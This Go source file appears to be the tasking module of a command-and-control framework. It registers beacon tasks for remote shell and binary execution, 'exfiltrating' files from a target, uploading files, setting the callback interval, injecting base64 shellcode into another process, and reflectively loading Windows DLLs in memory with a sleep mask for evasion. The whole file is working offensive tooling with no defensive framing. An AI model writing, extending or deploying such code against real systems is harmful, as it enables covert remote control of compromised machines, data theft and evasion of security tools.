package ttp

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strconv"
)

type Arg struct {
	Name        string `json:"name"`
	Required    bool   `json:"required,omitempty"`
	Description string `json:"description,omitempty"`
	Default     string `json:"default,omitempty"`
}

type Spec struct {
	Name        string `json:"name"`
	Description string `json:"description,omitempty"`
	Args        []Arg  `json:"args,omitempty"`
	Generate    func(params map[string]string) ([]byte, error)
}

var registry = map[string]*Spec{}

func Register(s *Spec) {
	if s == nil || s.Name == "" {
		panic("ttp: spec requires a name")
	}
	registry[s.Name] = s
}

func Lookup(name string) (*Spec, bool) {
	s, ok := registry[name]
	return s, ok
}

func List() []*Spec {
	out := make([]*Spec, 0, len(registry))
	for _, s := range registry {
		out = append(out, s)
	}
	return out
}

func Generate(name string, params map[string]string) ([]byte, error) {
	s, ok := registry[name]
	if !ok {
		return nil, fmt.Errorf("ttp: unknown task type %q", name)
	}
	for _, a := range s.Args {
		if a.Required {
			v, ok := params[a.Name]
			if !ok || v == "" {
				return nil, fmt.Errorf("ttp: %s requires argument %q", name, a.Name)
			}
		}
	}
	return s.Generate(params)
}

func obj(v any) []byte {
	b, err := json.Marshal(v)
	if err != nil {
		panic(err)
	}
	return b
}

func init() {
	Register(&Spec{
		Name:        "shell",
		Description: "Run a command through the beacon's shell",
		Args: []Arg{
			{Name: "cmd", Required: true, Description: "command to execute"},
		},
		Generate: func(p map[string]string) ([]byte, error) {
			return obj(map[string]string{"cmd": p["cmd"]}), nil
		},
	})

	Register(&Spec{
		Name:        "exec",
		Description: "Execute a binary with arguments",
		Args: []Arg{
			{Name: "path", Required: true, Description: "path to executable"},
			{Name: "args", Description: "space separated arguments"},
		},
		Generate: func(p map[string]string) ([]byte, error) {
			return obj(map[string]any{"path": p["path"], "args": p["args"]}), nil
		},
	})

	Register(&Spec{
		Name:        "sleep",
		Description: "Set beacon callback interval in seconds",
		Args: []Arg{
			{Name: "seconds", Required: true, Description: "seconds between callbacks"},
		},
		Generate: func(p map[string]string) ([]byte, error) {
			secs, err := strconv.Atoi(p["seconds"])
			if err != nil || secs < 1 || secs > 86400 {
				return nil, fmt.Errorf("ttp: sleep seconds must be 1..86400")
			}
			return obj(map[string]int{"seconds": secs}), nil
		},
	})

	Register(&Spec{
		Name:        "download",
		Description: "Exfiltrate a file from the target",
		Args: []Arg{
			{Name: "src", Required: true, Description: "remote path to read"},
		},
		Generate: func(p map[string]string) ([]byte, error) {
			return obj(map[string]string{"src": p["src"]}), nil
		},
	})

	Register(&Spec{
		Name:        "upload",
		Description: "Write a file to the target",
		Args: []Arg{
			{Name: "dst", Required: true, Description: "remote destination path"},
		},
		Generate: func(p map[string]string) ([]byte, error) {
			return obj(map[string]string{"dst": p["dst"]}), nil
		},
	})

	Register(&Spec{
		Name:        "kill",
		Description: "Terminate the beacon",
		Generate: func(p map[string]string) ([]byte, error) {
			return obj(map[string]any{}), nil
		},
	})

	Register(&Spec{
		Name:        "inject",
		Description: "Inject shellcode into a process",
		Args: []Arg{
			{Name: "data", Required: true, Description: "base64-encoded shellcode"},
			{Name: "pid", Description: "target process id (default: self)"},
		},
		Generate: func(p map[string]string) ([]byte, error) {
			raw, err := base64.StdEncoding.DecodeString(p["data"])
			if err != nil {
				return nil, fmt.Errorf("ttp: inject data is not valid base64: %v", err)
			}
			pid := 0
			if p["pid"] != "" {
				var err error
				pid, err = strconv.Atoi(p["pid"])
				if err != nil {
					return nil, fmt.Errorf("ttp: inject pid must be an integer")
				}
			}
			return obj(map[string]any{"data": base64.StdEncoding.EncodeToString(raw), "pid": pid}), nil
		},
	})

	Register(&Spec{
		Name:        "dll",
		Description: "Reflectively load a Windows x64 DLL from memory (self)",
		Args: []Arg{
			{Name: "data", Required: true, Description: "base64-encoded PE DLL"},
			{Name: "fn", Description: "export to call after DLL_PROCESS_ATTACH"},
			{Name: "mask", Description: "register the module's code pages with the sleep mask (true/false)"},
		},
		Generate: func(p map[string]string) ([]byte, error) {
			if p["data"] == "" {
				return nil, fmt.Errorf("ttp: dll requires base64 data")
			}
			raw, err := base64.StdEncoding.DecodeString(p["data"])
			if err != nil {
				return nil, fmt.Errorf("ttp: dll data is not valid base64: %v", err)
			}
			return obj(map[string]any{
				"data": base64.StdEncoding.EncodeToString(raw),
				"fn":   p["fn"],
				"mask": p["mask"] == "true",
			}), nil
		},
	})
}
